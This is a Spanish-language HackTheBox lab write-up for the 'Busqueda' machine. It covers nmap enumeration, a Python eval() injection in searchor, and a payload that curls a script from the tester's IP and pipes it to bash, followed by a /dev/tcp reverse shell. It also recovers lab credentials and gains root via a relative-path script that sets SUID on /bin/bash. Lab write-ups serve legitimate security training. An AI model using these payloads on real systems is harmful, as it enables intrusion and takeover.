---
layout: default
title: Busqueda
parent: HackTheBox
grand_parent: Writeups
---

# Busqueda
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Descubriremos que la pagina esta haciendo uso de searchor el cual tiene una vulnerabilidad en eval() la cual nos permitira una ejecucion arbitraria de codigo que conduce a un RCE,
{:.lead}

## Enumeracion

Iniciamos con un escaneo con el comando

```nmap -sS -n -Pn --open -p- 10.129.58.76```

Donde le indicamos que con:

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay varios puertos abiertos:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora escanearemos los puertos 22, 80 buscando la version y servicio y demas informacion:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

No nos reporta mucha informacion interesante y aun no tenemos credenciales para SSH.

Si interceptamos la peticion con burp, podemos ver que nuestro input esta pasando por el parametro ```query```

![](/assets/img/busqueda/busqueda2.png)

## Vulnerabilidad en searchor

Si vemos en el footer de la pagina, podemos ver que esta usando ```searchor```

![](/assets/img/busqueda/busqueda3.png)

Si le damos click en el nombre, nos mandara a su repo de github, sin embargo la version que sale es la ```2.5.2```, asi que empezaremos a buscar entre las versiones, a ver si encontramos algo interesante.

En la version ```2.4.2``` se arreglo una vulnerabilidad en la busqueda por CLI:

![](/assets/img/busqueda/busqueda4.png)

Al ver las notas del parche, basicamente nos dice que se removio el metodo ```eval()``` de la busqueda por CLI, ya que podiamos ejecutar codigo arbitrario:

```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
```

Podemos ver que se esta usando el metodo ```eval()```, donde el primer argumento que recibe, el cual se le llama ```expresion```, es el input que nosotros le mandamos desde la pagina, al ver un poquito del metodo eval, encontre que la ```expresion``` es evaluada como una expresion de python, y el valor de retorno de ```eval()```, es el resultado de evaluar la ```expresion```. Si quieres saber mas has click [aqui](https://www.programiz.com/python-programming/methods/built-in/eval)

## Explotando la funcion eval()

Guiandome de este [link](http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html), intentare ejecutar comandos en el servidor, cree un payload para mandarme una revese shell:

```python
',eval("__import__('os').system('curl http://<tu_IP>:8086/shell.html | bash')"))#
```
Y en mi archivo shell.html tengo esto:

```
bash -i >& /dev/tcp/<tu_IP>/443 0>&1
```
Ojo: puse el puerto 8086 por que el 8080 y el 80 los tengo ocupados

Y ya llego la reserve shell:

![](/assets/img/busqueda/busqueda5.png)


## Flag de user

Si listamos el directorio, podemos ver que existe uno de .git:

```
-rw-r--r-- 1 www-data www-data 1.1K Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4.0K Apr 12 12:44 .git
drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 templates
```
Al listar el contenido, encontramos unas credenciales y un subdominio:

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Usuario: cody

Pass: jh1usoih2bkjaspwe92

Subdominio: gitea.searcher.htb

Al iniciar por SSH con cody, no nos deja, asi que tenemos que hacerlo con svc

Y ya tenemos la flag de user:

```
svc@busqueda:~$ cat user.txt 
9d73b3b689d79b82c42cce959*******
```

## Flag de root

Si buscamos por archivos que podamos ejecutar como root tenemos uno de python:

```
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Al ejecutarlo, vemos que recibe varios argumentos:

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Si vemos los contenedores de docker podemos ver varios:

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 3 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 3 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Al ver el contenido del contenedor ```mysql_db```, podemos ver unas credenciales:

![](/assets/img/busqueda/busqueda6.png)

En donde la contraseña de gitea es: ```yuiu1hoiu4i5ho1uh``` y el usuario ```administrator```

Una vez iniciados sesion en gitea y navegando un poco, encontre el script que estabamos ejecutando:

```python
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

Donde vi vemos la opcion de ```full-checkup``` esta ejecutando un archivo sh:

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

Donde el script ```full-checkup.sh``` no se le indica la ruta, es decir, se ejecuta desde el directorio donde este el usuario, asi que... ¿Por que no crearlo?, me ire al directorio /tmp y dentro del script, le asignare permisos SUID a /bin/bash:

```
#!/bin/bash
chmod +s /bin/bash
```

Ahora solo ponemos: ```bash -p``` y ya somos root

```
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
f46884c23c53cc716ac549803*******
```

Eso ha sido todo, gracias por leer ❤